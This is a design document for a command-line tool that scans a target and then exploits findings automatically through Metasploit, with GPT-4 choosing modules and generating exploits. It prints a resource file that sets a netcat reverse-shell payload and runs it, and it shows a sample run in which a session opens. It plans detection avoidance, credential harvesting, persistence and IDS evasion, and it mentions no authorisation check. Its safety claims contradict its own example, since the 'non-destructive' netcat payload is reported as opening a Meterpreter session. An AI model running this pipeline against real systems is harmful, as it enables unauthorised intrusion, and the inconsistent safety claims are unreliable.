# Bug Bounty CLI - Architecture with Metasploit Integration

## System Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         User Input                               │
│                    bugbounty pentest --target                    │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                      main.py (CLI)                               │
│  - Parse arguments                                               │
│  - Check API keys                                                │
│  - Initialize PentestEngine                                      │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                   PentestEngine                                  │
│  - Orchestrates scanning and exploitation                        │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                ┌───────────┴───────────┐
                │                       │
                ▼                       ▼
┌─────────────────────────┐   ┌──────────────────────────┐
│   Phase 1: Scanning     │   │  Phase 2: Exploitation   │
└─────────────────────────┘   └──────────────────────────┘
                │                         │
                │                         │
                ▼                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              ScanOrchestrator (Threading)                        │
│  ┌─────────┬─────────┬─────────┬─────────┬─────────┐           │
│  │  XSS    │  SQLi   │  RCE    │  SSRF   │  etc.   │           │
│  │ Scanner │ Scanner │ Scanner │ Scanner │ Scanner │           │
│  └─────────┴─────────┴─────────┴─────────┴─────────┘           │
│                                                                  │
│  Uses: Nmap, SQLMap, Nikto, Custom Scanners                     │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│              Vulnerability Results                               │
│  - Type, Severity, Location, Evidence                            │
│  - CVE ID (if available)                                         │
│  - Payload (if found)                                            │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
        ┌───────────────────────────────────────┐
        │   For Each Vulnerability Found:       │
        └───────────────┬───────────────────────┘
                        │
        ┌───────────────┴────────────────┐
        │                                │
        ▼                                ▼
┌──────────────────────┐     ┌──────────────────────────┐
│  AI Exploit Gen      │     │  Metasploit Integrator   │
│  (if --ai-exploits)  │     │  (if --metasploit)       │
└──────────────────────┘     └──────────────────────────┘
        │                                │
        │                                │
        ▼                                ▼
┌──────────────────────┐     ┌──────────────────────────┐
│   OpenAI API         │     │   Metasploit Search      │
│  - Generate payload  │     │  - Search by CVE         │
│  - Generate steps    │     │  - Search by type        │
│  - Alternatives      │     │  - Search by tech        │
└──────────────────────┘     └──────────────────────────┘
                                        │
                                        ▼
                             ┌──────────────────────────┐
                             │  AI Module Selection     │
                             │  (OpenAI GPT-4)          │
                             │  - Analyze rank          │
                             │  - Match relevance       │
                             │  - Select best           │
                             └──────────────────────────┘
                                        │
                                        ▼
                             ┌──────────────────────────┐
                             │  Create RC File          │
                             │  use exploit/...         │
                             │  set RHOSTS              │
                             │  set RPORT               │
                             │  set PAYLOAD             │
                             │  exploit -z              │
                             └──────────────────────────┘
                                        │
                                        ▼
                             ┌──────────────────────────┐
                             │  Execute msfconsole      │
                             │  msfconsole -q -r file   │
                             └──────────────────────────┘
                                        │
                                        ▼
                             ┌──────────────────────────┐
                             │  Parse Output            │
                             │  - Session opened?       │
                             │  - Session ID            │
                             │  - Shell/Meterpreter     │
                             │  - Errors                │
                             └──────────────────────────┘
                                        │
                                        ▼
┌─────────────────────────────────────────────────────────────────┐
│              ExploitableVulnerability                            │
│  - Vulnerability details                                         │
│  - Exploit success status                                        │
│  - Impact assessment                                             │
│  - Metasploit module used                                        │
│  - Session ID (if successful)                                    │
│  - Access level (shell/meterpreter)                              │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Report Generation                              │
│  - JSON / HTML / PDF / Markdown                                  │
│  - Vulnerability summary                                         │
│  - Exploitation results                                          │
│  - Session information                                           │
│  - Remediation recommendations                                   │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
                    ┌───────────────┐
                    │  Final Report │
                    └───────────────┘
```

## Component Details

### 1. CLI Layer (main.py)
**Responsibility:** Parse user input, validate configuration, initialize engine
```python
bugbounty pentest --target URL --metasploit --ai-exploits
```

### 2. Pentest Engine
**Responsibility:** Orchestrate scanning and exploitation phases
- Manages workflow
- Coordinates components
- Aggregates results
- Calculates risk scores

### 3. Scanner Orchestrator
**Responsibility:** Parallel vulnerability scanning
- Multi-threaded execution
- OWASP Top 10 coverage
- Integration with Kali tools (Nmap, SQLMap, Nikto)

### 4. AI Exploit Generator
**Responsibility:** Generate custom exploits using OpenAI
- Payload generation
- Step-by-step exploitation instructions
- Alternative payload variations
- Explanation of how exploit works

### 5. Metasploit Integrator
**Responsibility:** Interface with Metasploit Framework

**Key Methods:**
```python
search_modules(vulnerability)          # Find relevant modules
select_best_module_with_ai(vuln, mods) # AI selection
exploit_vulnerability(vuln, module)    # Execute exploit
generate_payload(type, lhost, lport)   # msfvenom wrapper
```

**Search Strategy:**
1. Search by CVE ID (if available)
2. Search by vulnerability type mapping
3. Search by detected technology/platform
4. Remove duplicates
5. Rank by exploit reliability

**AI Selection Process:**
```
Input: Vulnerability + List of Modules
       ↓
OpenAI GPT-4 Analysis:
- Exploit rank priority
- Platform compatibility
- Type relevance
- Disclosure date
       ↓
Output: Best module (by number)
```

**Exploitation Flow:**
1. Create resource file with commands
2. Execute `msfconsole -q -r file.rc`
3. Parse output for success indicators
4. Extract session ID and access level
5. Clean up temporary files

### 6. Result Aggregation
**Responsibility:** Combine all exploitation results

**Data Structure:**
```python
ExploitableVulnerability(
    vulnerability=Vulnerability(...),
    exploit_success=True,
    exploit_output="[session 1 opened]...",
    impact="CRITICAL: Full system access...",
    metasploit_module="exploit/multi/http/php_upload_exec",
    metasploit_session_id=1,
    access_level="meterpreter"
)
```

### 7. Report Generator
**Responsibility:** Generate comprehensive reports

**Formats:**
- JSON (machine-readable)
- HTML (browser-viewable)
- PDF (professional reports)
- Markdown (documentation)

**Content:**
- Executive summary
- Technical details
- Exploitation evidence
- Remediation steps
- CVSS scoring

## Data Flow Example

### Scenario: RCE Vulnerability Found

```
1. Scanner discovers: PHP upload vulnerability at /upload.php
   ↓
2. Vulnerability object created:
   {
     type: "rce",
     title: "Unrestricted File Upload",
     location: "/upload.php",
     severity: "CRITICAL",
     cve_id: null
   }
   ↓
3. Metasploit search for "remote code execution" + "php"
   ↓
4. Found 8 modules:
   - exploit/multi/http/php_upload_exec (excellent)
   - exploit/unix/webapp/php_rce (good)
   - ...
   ↓
5. AI selects: exploit/multi/http/php_upload_exec
   Reason: "Highest rank, direct file upload exploit"
   ↓
6. Generate resource file:
   use exploit/multi/http/php_upload_exec
   set RHOSTS target.com
   set RPORT 80
   set PAYLOAD cmd/unix/reverse_netcat
   exploit -z
   ↓
7. Execute: msfconsole -q -r /tmp/msf_rc_12345.rc
   ↓
8. Output: "[*] Sending stage... [*] Meterpreter session 1 opened"
   ↓
9. Parse result:
   - Success: True
   - Session ID: 1
   - Access: meterpreter
   ↓
10. Create ExploitableVulnerability:
    Impact: "CRITICAL: Full system access achieved via Metasploit"
   ↓
11. Add to final report
```

## Key Design Decisions

### 1. Why Resource Files?
- Clean separation of concerns
- Easy debugging (can inspect RC files)
- Consistent execution environment
- Automatic cleanup

### 2. Why AI for Module Selection?
- Metasploit has 1000+ modules
- Manual selection is time-consuming
- AI can consider multiple factors simultaneously
- Better than simple rank-based sorting

### 3. Why Background Sessions (`exploit -z`)?
- Non-blocking execution
- Multiple exploits can run in parallel
- Sessions don't interfere with output parsing
- Cleaner separation of exploitation and analysis

### 4. Safe by Default
- Non-destructive payloads (reverse_netcat vs. meterpreter)
- Timeouts prevent hanging
- Isolated execution (resource files)
- Sessions auto-terminate

## Performance Considerations

### Parallel Scanning
- Thread pool for vulnerability scanners
- Configurable thread count
- Rate limiting to avoid detection

### Metasploit Optimization
- Search cached locally
- Reuse module database
- Batch similar exploits
- Timeout aggressive exploits

### API Rate Limiting
- OpenAI API has rate limits
- Batch AI requests when possible
- Cache AI decisions for similar vulnerabilities
- Fallback to heuristic selection

## Security Boundaries

```
┌─────────────────────────────────────────┐
│        Bug Bounty CLI Process           │
│  ┌───────────────────────────────────┐  │
│  │  Read-Only Operations:            │  │
│  │  - Scanning                       │  │
│  │  - CVE lookups                    │  │
│  │  - Module searching               │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  Write Operations (Isolated):     │  │
│  │  - Temporary RC files             │  │
│  │  - Log files                      │  │
│  │  - Report files                   │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  Dangerous Operations (Gated):    │  │
│  │  - Metasploit exploitation        │  │
│  │  - Requires --metasploit flag     │  │
│  │  - Safe payloads by default       │  │
│  │  - Timeout protection             │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
                │
                ▼
        ┌───────────────┐
        │  Target System│
        └───────────────┘
```

## Extension Points

### Adding New Vulnerability Types
```python
# src/scanner/new_scanner.py
class NewVulnerabilityScanner(BaseScanner):
    def scan(self, target):
        # Implementation
        pass
```

### Custom Metasploit Payloads
```python
# src/testing/pentest_engine.py
def _select_payload_for_vulnerability(self, vuln):
    # Customize payload selection
    pass
```

### Additional AI Providers
```python
# src/ai/exploit_generator.py
class AlternativeAIProvider:
    # Implement OpenAI-compatible interface
    pass
```

## Monitoring & Logging

### Log Levels
- **INFO**: Normal operation (scanning, searching)
- **WARNING**: Non-critical issues (modules not found, AI fallback)
- **ERROR**: Critical failures (Metasploit timeout, API errors)
- **DEBUG**: Detailed operation info (payloads, commands)

### Metrics Tracked
- Vulnerabilities found
- Exploits attempted
- Successful exploitations
- Failed exploitations
- AI selection accuracy
- Metasploit module usage
- Execution times

## Future Enhancements

1. **Multi-target support** - Scan multiple targets in parallel
2. **Custom module scripts** - User-defined Metasploit modules
3. **Session interaction** - Automated post-exploitation
4. **Credential harvesting** - Extract credentials from exploited systems
5. **Persistence testing** - Test for backdoor installation
6. **Pivot detection** - Identify lateral movement opportunities
7. **Evasion techniques** - IDS/IPS bypass strategies
8. **Docker integration** - Isolated exploitation environment
